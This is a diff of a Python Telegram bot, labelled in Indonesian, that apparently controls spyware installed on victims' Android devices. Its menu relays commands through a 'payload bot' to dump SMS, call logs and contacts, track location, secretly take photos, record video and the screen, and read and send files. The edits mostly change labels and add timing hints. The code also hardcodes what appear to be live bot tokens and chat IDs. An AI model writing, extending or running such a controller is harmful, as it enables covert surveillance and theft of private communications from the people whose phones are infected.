@@ -13,7 +13,7 @@ from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandle
 # ── KONFIGURASI ──
 TOKEN = "9067923295:AAE-sOBegpDh0IgaLKpn32-Nlmv9ibGYgwo" 
 PAYLOAD_BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"
-PAYLOAD_BOT_USERNAME = "IsiUsernameBotPayloadKamu" # GANTI INI
+PAYLOAD_BOT_USERNAME = "a" # GANTI INI
 
 ALLOWED_CHAT_ID = "8598136412" 
 GROUP_ID = "-1004405270823" 
@@ -199,15 +199,15 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             dev = devices[idx]
             keyboard = [
                 [InlineKeyboardButton("📂 Cek File", callback_data=f"cmd_cek_file_{idx}"), InlineKeyboardButton("📤 Send File", callback_data=f"cmd_send_file_{idx}")],
-                [InlineKeyboardButton("📩 Dump SMS", callback_data=f"cmd_dump_sms_{idx}"), InlineKeyboardButton("📞 Dump Telpon", callback_data=f"cmd_dump_telpon_{idx}")],
-                [InlineKeyboardButton("👥 Dump Kontak", callback_data=f"cmd_dump_kontak_{idx}"), InlineKeyboardButton("📍 Lacak Lokasi", callback_data=f"cmd_lacak_{idx}")],
+                [InlineKeyboardButton("📩 Dump SMS (Full)", callback_data=f"cmd_dump_sms_{idx}"), InlineKeyboardButton("📞 Dump Telpon", callback_data=f"cmd_dump_telpon_{idx}")],
+                [InlineKeyboardButton("👥 Dump Kontak (Full)", callback_data=f"cmd_dump_kontak_{idx}"), InlineKeyboardButton("📍 Lacak Lokasi", callback_data=f"cmd_lacak_{idx}")],
                 [InlineKeyboardButton("📸 Foto Depan", callback_data=f"cmd_foto_depan_{idx}"), InlineKeyboardButton("📷 Foto Belakang", callback_data=f"cmd_foto_belakang_{idx}")],
                 [InlineKeyboardButton("🎥 Rekam Depan", callback_data=f"cmd_rekam_depan_{idx}"), InlineKeyboardButton("🎥 Rekam Belakang", callback_data=f"cmd_rekam_belakang_{idx}")],
                 [InlineKeyboardButton("🖼️ Screenshot", callback_data=f"cmd_ss_{idx}"), InlineKeyboardButton("⏺️ Screen Record", callback_data=f"cmd_screen_record_{idx}")],
                 [InlineKeyboardButton("🌐 Buka URL", callback_data=f"cmd_buka_url_{idx}")],
                 [InlineKeyboardButton("⬅️ Kembali", callback_data="menu_device")]
             ]
-            await query.edit_message_text(f"🎮 **Kontrol: {dev['name']}**\nID: `{dev['id']}`\n\nPilih aksi:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+            await query.edit_message_text(f"🎮 **Kontrol: {dev['name']}**\nID: `{dev['id']}`\n\nPilih aksi (Kamu punya waktu 2 menit untuk respon instan):", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
     elif query.data.startswith("cmd_"):
         parts = query.data.split("_")
@@ -220,7 +220,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             perintah = f"/{cmd_base} {dev_id}"
             url_payload = f"https://t.me/{PAYLOAD_BOT_USERNAME}"
             keyboard = [[InlineKeyboardButton("🚀 Buka Bot Payload & Kirim Perintah", url=url_payload)]]
-            await query.message.reply_text(f"⚠️ **JANGAN KETIK DI CHAT INI!**\n\nBuka **Bot Payload**, lalu **KIRIM** teks ini:\n\n`{perintah}`", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+            await query.message.reply_text(f"⚠️ **JANGAN KETIK DI CHAT INI!**\n\nBuka **Bot Payload**, lalu **KIRIM** teks ini:\n\n`{perintah}`\n\n*(Kirim dalam 2 menit untuk respon instan).*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
 async def handle_checkin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = str(update.effective_chat.id)
